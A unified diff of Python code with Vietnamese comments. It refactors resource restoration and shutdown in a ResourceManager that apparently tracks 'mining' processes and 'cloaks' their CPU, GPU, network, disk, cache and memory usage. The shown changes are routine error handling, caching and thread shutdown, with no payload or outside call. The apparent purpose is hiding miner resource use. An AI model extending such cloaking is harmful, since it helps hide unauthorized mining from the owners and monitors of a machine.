@@ -233,18 +233,31 @@ class SharedResourceManager:
             name = process.name
             restored = False
 
+            # Kiểm tra tiến trình tồn tại trước khi thực hiện
+            if not psutil.pid_exists(pid):
+                self.logger.error(f"Tiến trình PID={pid} không tồn tại. Bỏ qua khôi phục tài nguyên.")
+                return
+
+            # Lưu trữ chiến lược đã tạo để tái sử dụng
+            strategies_cache = {}
+
             # Duyệt qua các chiến lược được hỗ trợ
             for strategy_name in ['cpu', 'gpu', 'network', 'disk_io', 'cache', 'memory']:
-                # Tạo chiến lược tương ứng từ factory
-                strategy = CloakStrategyFactory.create_strategy(
-                    strategy_name,
-                    self.config,
-                    self.logger,
-                    self.resource_managers
-                )
-                if not strategy:
-                    self.logger.warning(f"Không thể tạo chiến lược {strategy_name} cho PID={pid}.")
-                    continue
+                if strategy_name in strategies_cache:
+                    strategy = strategies_cache[strategy_name]
+                else:
+                    # Tạo chiến lược mới nếu chưa có trong cache
+                    strategy = CloakStrategyFactory.create_strategy(
+                        strategy_name,
+                        self.config,
+                        self.logger,
+                        self.resource_managers
+                    )
+                    if strategy:
+                        strategies_cache[strategy_name] = strategy
+                    else:
+                        self.logger.warning(f"Không thể tạo chiến lược {strategy_name} cho PID={pid}.")
+                        continue
 
                 try:
                     # Gọi hàm restore trên chiến lược
@@ -252,8 +265,11 @@ class SharedResourceManager:
                     self.logger.info(f"Đã khôi phục tài nguyên '{strategy_name}' cho PID={pid}.")
                     restored = True
                 except Exception as e:
-                    self.logger.error(f"Lỗi khi khôi phục tài nguyên '{strategy_name}' cho PID={pid}: {e}")
+                    self.logger.error(
+                        f"Lỗi khi khôi phục tài nguyên '{strategy_name}' cho PID={pid}: {e}\n{traceback.format_exc()}"
+                    )
 
+            # Log kết quả khôi phục
             if restored:
                 self.logger.info(f"Khôi phục xong tài nguyên cho {name} (PID={pid}).")
             else:
@@ -826,28 +842,54 @@ class ResourceManager(IResourceManager):
                     pid = proc.pid
                     state = self.process_states.get(pid, "normal")
                     if state == "cloaked":
-                        self.logger.info(f"Auto-restore PID={pid} trước khi tắt.")
-                        self.process_states[pid] = "restoring"
-                        if self.shared_resource_manager:
-                            self.shared_resource_manager.restore_resources(proc)
-                        self.process_states[pid] = "normal"
+                        try:
+                            self.logger.info(f"Auto-restore PID={pid} trước khi tắt.")
+                            self.process_states[pid] = "restoring"
+                            if self.shared_resource_manager:
+                                self.shared_resource_manager.restore_resources(proc)
+                            self.process_states[pid] = "normal"
+                        except Exception as e:
+                            self.logger.error(f"Lỗi khi khôi phục tài nguyên cho PID={pid}: {e}")
+            else:
+                self.logger.warning("Không thể acquire mining_processes_lock trong thời gian tối đa. Bỏ qua khôi phục tài nguyên.")
         except Exception as e:
             self.logger.error(f"Lỗi khi khôi phục tài nguyên: {e}")
         finally:
             try:
                 self.mining_processes_lock.release()
             except RuntimeError:
-                pass
+                self.logger.warning("Không thể release mining_processes_lock. Có thể lock đã được release hoặc chưa được acquire.")
 
-        # Thêm khoản thời gian chờ
-        delay_time = 10  # Thời gian chờ (giây), có thể điều chỉnh
-        self.logger.info(f"Chờ {delay_time} giây trước khi tiếp tục tắt NVML...")
-        time.sleep(delay_time)
+        # 2. Chờ xác nhận watchers đã dừng (thay vì delay tĩnh)
+        start_time = time.time()
+        timeout = 10  # Thời gian chờ tối đa (giây)
+        self.logger.info(f"Chờ tối đa {timeout} giây để dừng watchers...")
 
-        # 2. Tắt NVML
-        if self.shared_resource_manager:
-            self.shared_resource_manager.shutdown_nvml()
+        while time.time() - start_time < timeout:
+            if all(not w.is_alive() for w in self.watchers):
+                self.logger.info("Tất cả thread watchers đã dừng.")
+                break
+            time.sleep(5)
+        else:
+            self.logger.warning("Một số watchers vẫn đang chạy sau thời gian chờ tối đa.")
 
-        # 3. Dừng các thread watchers
+        # 3. Tắt NVML
+        try:
+            if self.shared_resource_manager:
+                self.shared_resource_manager.shutdown_nvml()
+                self.logger.info("NVML đã được tắt thành công.")
+            else:
+                self.logger.warning("shared_resource_manager không tồn tại. Bỏ qua việc tắt NVML.")
+        except Exception as e:
+            self.logger.error(f"Lỗi khi tắt NVML: {e}")
+
+        # 4. Dừng các thread watchers
         for w in self.watchers:
-            w.join(timeout=2)
+            try:
+                w.join(timeout=2)
+                if w.is_alive():
+                    self.logger.warning(f"Thread watcher {w.name} không thể dừng đúng cách.")
+            except Exception as e:
+                self.logger.error(f"Lỗi khi dừng thread watcher {w.name}: {e}")
+
+        self.logger.info("Dừng ResourceManager... (HOÀN THÀNH)")
